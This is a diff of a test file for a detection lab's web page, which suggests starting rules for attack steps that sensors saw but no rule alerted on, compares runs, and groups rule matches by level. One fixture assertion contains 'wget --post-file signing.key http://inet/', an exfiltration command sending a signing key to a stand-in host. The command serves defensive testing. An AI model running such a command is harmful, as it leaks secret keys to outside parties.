@@ -6,7 +6,7 @@ import { describe, expect, it, vi } from "vitest";
 import { api, type Delta, type DeltaStep, type DeltaSummary, type RecordingSummary } from "../src/lib/api";
 import { activeProviderKind, backPath, candidates, draftKey, fixPath, modelWords, tieOf, triedFor } from "../src/lib/fix-step";
 import { RUNNING_POLL_MS } from "../src/lib/recorded-runs";
-import type { Recording } from "../src/live/recording";
+import type { Recording, RuleLevel } from "../src/live/recording";
 import { FixStepPage } from "../src/pages/FixStep";
 import type { CatalogResponse } from "../src/types";
 import { alert, at, event, recording as fixture, step } from "./live-fixture";
@@ -98,9 +98,16 @@ function delta(id: string, before: { id: string; sha256: string }, after: { id: 
   };
 }
 
-const WATCH = delta("0000000000000001", { id: "rec-1", sha256: SHA }, { id: "rec-2", sha256: OTHER_SHA }, [movedStep("1", "unseen", "seen", "better: unseen to seen by the published rules; price: 2 ordinary events before, 2 after; one pair of runs", "price: 2 ordinary events before, 2 after")]);
-const RULE_PRICE = "price: 1 rule more (The run accepted 1 of the 2 rules written in this repository.)";
+const WATCH_PRICE = "price: published rules that alerted on ordinary activity: 2 before, 2 after; ordinary events: 8902 before, 8841 after";
+const WATCH = delta("0000000000000001", { id: "rec-1", sha256: SHA }, { id: "rec-2", sha256: OTHER_SHA }, [movedStep("1", "unseen", "seen", `better: unseen to seen by the published rules; ${WATCH_PRICE}; one pair of runs`, WATCH_PRICE)]);
+// The lab's line for a comparison of its own rules, as the shipped comparison of a new rule words it.
+const RULE_PRICE = "price not counted: the lab's rules that matched ordinary activity are left out of the recording before it is written (before: The run accepted 1 of the 2 rules written in this repository.)";
 const ELSEWHERE = delta("0000000000000002", { id: "rec-8", sha256: "d".repeat(64) }, { id: "rec-9", sha256: "e".repeat(64) }, [movedStep("1", "seen", "alerted", `better: seen to alerted with the lab's rules; ${RULE_PRICE}`, RULE_PRICE)]);
+/** The same comparison when it names one new rule of the lab's own and the run after accepted it. */
+function keptRule(pair: { summary: DeltaSummary; delta: Delta }): { summary: DeltaSummary; delta: Delta } {
+  const rules: Delta["lab_rules"] = [{ rule: "r1", title: "Shell History File Truncated In Place", change: "new", before: null, after: { accepted: true, reason: "it alerted on no ordinary activity" } }];
+  return { summary: { ...pair.summary, declared_change: "detectors:lab", lab_rules: rules }, delta: { ...pair.delta, declared_change: "detectors:lab", lab_rules: rules } };
+}
 
 /** A comparison of two later runs whose recordings give their steps stable ids, which moved the steps given. */
 function later(id: string, steps: DeltaStep[], title?: string) {
@@ -213,8 +220,10 @@ describe("the page for fixing a step", () => {
   it("for a step seen with no alert, shows what matched it below alert level with what the recording says of the lab's rules, and an empty draft", async () => {
     mount("2");
     const start = await screen.findByRole("region", { name: "Where to start" });
-    expect(start).toHaveTextContent("A sensor recorded this test, but no rule raised an alert. Start with a rule that matches what the sensor recorded.");
+    // The one published rule that matched it is the one to start from.
+    expect(start).toHaveTextContent('A sensor recorded this test, but no rule raised an alert. To alert here, start from the rule "Use Of Hidden Paths Or Files": it matched this step at low level.');
     const matched = screen.getByRole("region", { name: "Rules that matched it" });
+    expect(within(matched).getByRole("heading", { level: 3, name: "Published rules below alert level: for review" })).toBeVisible();
     const published = within(matched).getByRole("article", { name: "Use Of Hidden Paths Or Files" });
     expect(published).toHaveTextContent("review · low");
     expect(published).toHaveTextContent("published");
@@ -237,6 +246,48 @@ describe("the page for fixing a step", () => {
     expect(draft).toHaveAccessibleDescription(/in the folder of its kind under lab\/rules\/linux\/: .*auditd\/ for auditd/);
     // Every condition the lab applies before a run accepts a rule.
     expect(draft).toHaveAccessibleDescription(/A run accepts it only if it is at level high or critical, it alerts on at least one published test, every test it alerts on has a rerun with changed input arguments that took effect, it alerts on every such rerun, and it matches no event of ordinary activity\./);
+  });
+
+  it("names the published rule to start from, chosen as the step's caption chooses it, says why, and sets informational matches apart as analyse mode does", async () => {
+    const rule = (id: string, title: string, level: RuleLevel) => ({ id, title, level, origin: "pinned" as const });
+    const base = fixture({
+      steps: [step("1", 1, 2, { title: "Exfiltration Over Alternative Protocol - SSH", outcome: "seen", visibility: { answer: "telemetry only", basis: "4 archived events tied to the step", events: 4 } })],
+      events: ["1-1", "1-2", "1-3", "1-4", "1-5"].map((id, index) => event(id, "1", 1.1 + index / 10)),
+      alerts: [
+        alert("m1", "1", 1.1, ["1-1"], { counts: false, rule: rule("554", "File added to the system.", "low") }),
+        alert("m2", "1", 1.2, ["1-2"], { counts: false, rule: rule("5715", "sshd: authentication success.", "informational") }),
+        alert("m3", "1", 1.3, ["1-3"], { counts: false, rule: rule("553", "File deleted.", "medium") }),
+        alert("m4", "1", 1.4, ["1-4"], { counts: false, rule: rule("550", "Integrity checksum changed.", "medium") }),
+        alert("m5", "1", 1.5, ["1-5"], { counts: false, rule: rule("5501", "PAM: Login session opened.", "informational") }),
+      ],
+    });
+    // Two rules at the highest level: the one that matched less ordinary activity is the one to start from.
+    const run: Recording = { ...base, id: "rec-5", ordinary: { events: 900, matches: [
+      { rule: "File added to the system.", level: "low", count: 93 },
+      { rule: "sshd: authentication success.", level: "informational", count: 7 },
+      { rule: "File deleted.", level: "medium", count: 51 },
+      { rule: "Integrity checksum changed.", level: "medium", count: 38 },
+    ] } };
+    mount("1", { recording: run, pairs: [] });
+
+    const start = await screen.findByRole("region", { name: "Where to start" });
+    expect(start).toHaveTextContent('A sensor recorded this test, but no rule raised an alert. To alert here, start from the rule "Integrity checksum changed": it matched this step at medium level, and 38 events of ordinary activity too.');
+    expect(start).toHaveTextContent("Of the 5 published rules that matched it below alert level, it is the one at the highest level; a tie goes to the one that matched least ordinary activity.");
+    expect(start).not.toHaveTextContent("Start with a rule that matches what the sensor recorded");
+
+    const matched = screen.getByRole("region", { name: "Rules that matched it" });
+    const group = (name: string) => {
+      const heading = within(matched).getByRole("heading", { level: 3, name });
+      const box = heading.parentElement;
+      if (!box) throw new Error(`No group under ${name}.`);
+      return within(box).getAllByRole("article").map((card) => card.getAttribute("aria-label"));
+    };
+    expect(group("Published rules below alert level: for review")).toEqual(["File added to the system.", "File deleted.", "Integrity checksum changed."]);
+    expect(group("Published rules at informational level: nobody reviews them")).toEqual(["sshd: authentication success.", "PAM: Login session opened."]);
+    // An informational match is called informational, never one for review.
+    expect(within(matched).getByRole("article", { name: "sshd: authentication success." })).toHaveTextContent("informational");
+    expect(matched).not.toHaveTextContent(/review · informational/i);
+    expect(within(matched).getByRole("article", { name: "Integrity checksum changed." })).toHaveTextContent("review · medium");
   });
 
   it("offers no draft while the recording is still running, since a draft is kept for one finished file", async () => {
@@ -344,7 +395,7 @@ describe("the page for fixing a step", () => {
     const seen = mount("1", { recording: range, pairs: [] });
     const start = await screen.findByRole("region", { name: "Where to start" });
     // A step of an attack path is named and counted as a step, as the live view names it.
-    expect(start).toHaveTextContent("A sensor recorded this step, but no rule raised an alert. Start with a rule that matches what the sensor recorded.");
+    expect(start).toHaveTextContent('A sensor recorded this step, but no rule raised an alert. To alert here, start from the rule "sshd: Attempt to login using a non-existent user": it matched this step at low level.');
     expect(screen.getByText("step 1", { exact: true })).toBeVisible();
     expect(await within(screen.getByRole("region", { name: /^What was already tried/ })).findByText("No comparison has moved this step yet.")).toBeVisible();
     expect(start).toHaveTextContent(`The rules that ran in this range were ${RULES}. The range has no rules of the lab's own yet.`);
@@ -385,8 +436,9 @@ describe("the page for fixing a step", () => {
       shown.view.unmount();
     }
 
-    // A step whose host has no agent, recorded by the agent of the host it ran from.
+    // A step whose host has no agent, recorded by the agent of the host it ran from. No published rule matched it, so no rule is named.
     mount("3", { recording: range, pairs: [] });
+    expect(await screen.findByRole("region", { name: "Where to start" })).toHaveTextContent("A sensor recorded this step, but no rule raised an alert. Start with a rule that matches what the sensor recorded.");
     const goal = await screen.findByRole("region", { name: /^What was recorded/ });
     expect(within(goal).getByRole("article", { name: "Sensor Wazuh agent on web" })).toHaveTextContent("wget --post-file signing.key http://inet/");
   });
@@ -429,17 +481,29 @@ describe("the page for fixing a step", () => {
     expect(watch).toHaveTextContent("New auditd settings");
     expect(watch).toHaveTextContent("This run is the one before the change.");
     expect(watch).toHaveTextContent("Imported");
-    expect(within(watch).getByText("price: 2 ordinary events before, 2 after")).toHaveClass("cmp-price");
+    // The price in the words the comparison's card on Runs gives it.
+    expect(within(watch).getByText("2 published rules alert on ordinary activity, before and after")).toHaveClass("cmp-price");
     expect(within(watch).getByRole("link", { name: "Open the comparison at this step" })).toHaveAttribute("href", "/runs/compared/0000000000000001?step=1");
     expect(within(watch).getByRole("link", { name: "Open the same step in the after run" })).toHaveAttribute("href", `/runs/recorded/rec-2/${OTHER_SHA}?step=1&at=0&paused=1&mode=analyse&select=1`);
     // A comparison of other runs, tied by the step's stable id, and said to be of another run.
     expect(elsewhere).toHaveTextContent("Another run of the same list, not this one, with the same published test. Tied by the step's id 1");
     expect(within(elsewhere).queryByRole("link", { name: "Open the same step in the after run" })).toBeNull();
-    // The price's lead on the step's line, and the comparison's own words, with what the price quotes, one click away.
-    expect(within(elsewhere).getByText("price: 1 rule more")).toHaveClass("cmp-price");
+    // The price in plain words on the step's line, and the comparison's own words, with the lab's line, one click away.
+    expect(within(elsewhere).getByText("Not counted: the lab keeps its own rules' matches on ordinary activity out of the recording")).toHaveClass("cmp-price");
+    expect(elsewhere).not.toHaveTextContent("None in this run");
     expect(within(elsewhere).getByText(/The run accepted 1 of the 2 rules written in this repository/)).not.toBeVisible();
     await userEvent.setup().click(within(elsewhere).getByText("The comparison's own words"));
     expect(within(elsewhere).getByText(/The run accepted 1 of the 2 rules written in this repository/)).toBeVisible();
+  });
+
+  it("gives the price of a new rule the run after kept as the comparison's page does: none in this run, not the lab's raw line", async () => {
+    mount("1", { pairs: [keptRule(ELSEWHERE)] });
+    const tried = await screen.findByRole("region", { name: /^What was already tried/ });
+    const [line] = await within(tried).findAllByRole("listitem");
+    if (!line) throw new Error("The comparison should be listed.");
+    expect(within(line).getByText("None in this run: the new rule alerted on no ordinary activity, which the lab requires before it keeps a rule")).toHaveClass("cmp-price");
+    // The lab's own line stays, in the comparison's own words behind one click.
+    expect(within(line).getByText(/price not counted: the lab's rules that matched ordinary activity/)).not.toBeVisible();
   });
 
   it("finds the comparison of one run evaluated with two rule sets from either file the id holds", async () => {
